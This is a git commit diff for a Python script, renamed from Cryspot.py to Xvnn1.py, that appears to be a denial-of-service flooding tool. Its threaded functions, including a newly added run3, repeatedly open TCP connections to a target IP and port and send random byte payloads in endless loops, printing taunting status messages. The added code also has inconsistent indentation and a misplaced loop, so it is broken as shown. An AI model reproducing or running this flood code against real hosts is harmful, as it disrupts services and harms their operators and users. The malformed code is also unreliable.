400f9b621120964f5751c28c5a83961659087904
VarianD1 <96281577+VarianD1@users.noreply.github.com>
2021-12-28 17:37:14 +0700

    Update and rename Cryspot.py to Xvnn1.py

--- Xvnn1.py
+++ Xvnn1.py
@@ -3,7 +3,15 @@
 import random
 import socket
 import threading
+import socket
+import argparse
+import sys
+from time import time as tt
 import os
+import re
+import urllib.request
+import requests
+import os,sys
 
 os.system("clear")
 print("\033[93m")
@@ -39,7 +47,7 @@ def run():
                 except:
                         print("\033[94m Punten Goput, Yaaa gada orang ")
 def run2():
-        data = random._urandom(1961)
+        data = random._urandom(1490)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
@@ -52,7 +60,22 @@ def run2():
                 except:
                         s.close()
                         print("\033[93m Punten Goput, Yaaa gada orang")
-for y in range(threads):
+def run3():
+	      data = random._urandom(1024)
+      	i = random.choice(("[•]","[•]","[•]"))
+      	while True:
+	             	try:
+		                   	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		                   	s.connect((ip,port))
+		                   	s.send(data)
+		                   	for x in range(times):
+			                       	s.send(data)
+	                   		print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
+            		except:
+	                   		s.close()
+	                   		print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
+                  
+                  for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
                 th.start()
